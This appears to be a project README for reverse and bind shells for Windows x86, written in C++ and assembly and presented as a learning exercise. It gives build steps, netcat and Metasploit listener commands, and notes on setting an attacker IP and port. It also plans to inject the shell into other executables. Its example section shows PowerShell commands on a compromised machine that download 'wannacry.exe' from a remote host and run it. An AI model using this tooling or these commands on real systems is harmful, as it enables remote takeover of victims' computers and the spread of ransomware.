# Reverse_shell learning

## :one: Reverse Shell x86 :fr:

This tinny project showing how does work a reverse shell x86 in differents languages as cpp or in assembly code. the differentes methods describe below are very know and old, these tricks are widely documented on internet.

### Tree

* reverse_bind_cpp 
* reverse_bin_cpp_v2
  - try to catch ipv4 address of ethernet card
* Bind reverse written in object
* Reverse cpp ( reverse shell cpp )
* Reverse cpp written in object
* ASM Bind reverse shell
  - not terminated
* ASM v1 ( reverse shell asm )
  - Replace all address offsets of called functions
* ASM v2 ( reverse shell asm )
  - To do remote all TEB/PEB, remove all bytes null
  - Ligne 78 v2 : LoadLibraryA replace it by your own offset
  - Ligne 79 v2 : GetProcAddress replace it by your own offset
  - Ligne 193 v2: SOKADDR_IN set you own port and IP address
  
### Architecture

Win32 plateform

  - [x] XP 
  - [x] vista
  - [x] 7
  - [x] 10 - For all assembly codes Windows Defender detected that program is bad for himself 

### Soon

\[\*\] coding a lil program :
  * Open biary file exe
  * read PE
  * find EP
  * IAT import ws2_32.dll
  * Inject Reverse_shell
  * close binary file Exe
\[\*\] pass to x64

## :two: Compilation 

### Build ASM x86

```
$nasm -f win32 reverse_shell.s -o reverse_shell.o
$ld -m i386 reverse_shell.o -o reverse_shell32.exe
```
### Show Hex

```
$nasm -f bin reverse_shell.s -o reverse_shell_bin.o
$cat reverse_shell_bin | hexdump -C
```
### Build C++

Download Devcpp on windows plateform :

  - Project include library : **MinGW64/x86_64-w64-mingw32/lib32/libws2_32.lib**
  - Add **lib** directory to your project.
  - Build it.
  - execv.
  
## :three: Shell Connection 

### Reverse Tcp netcat

```
$netcat -v -l -p 4444
```

### Reverse Tcp msf

```
$ msfconsole
$ use exploit/multi/handler
$ show paylaods
$ set payloads generic/reverse_tcp
$ set RHOST [ip]
$ set LPORT [PORT]
$ exploit
```

### Reverse Bind Tcp netcat

```
$netcat -v victim_ip 4444
```
## :four: Example

### Win >= 7 Bind reverse shell \[ powershell.exe \]

<img src="https://zupimages.net/up/19/01/wq32.png">

After get a reverse powershell, you can download and lauch somes files with this trick, just using all power of Windows shell with wget command.
 
```
[ powershell command ]
>dir env:\
> $url=http://192.168.0.2/wannacry.exe
> wget $url -outfile [ PATH ]
> cmd
> start File
```

### Reverse Tcp With CPP \[ cmd.exe \] 

Write on an ide really basic devcpp on windows

- Inlude at your projet : MinGw-x86-64\libws2_32.so

<img src="https://zupimages.net/up/18/52/3s63.png">
<img src="https://zupimages.net/up/18/52/y6mk.png">

### Win 10 pro reverse cpp \[ cmd.exe \]

<img src="https://zupimages.net/up/18/52/ztqp.png">
<img src="https://zupimages.net/up/18/52/dt6r.png">
<img src="https://zupimages.net/up/18/52/a96f.png">


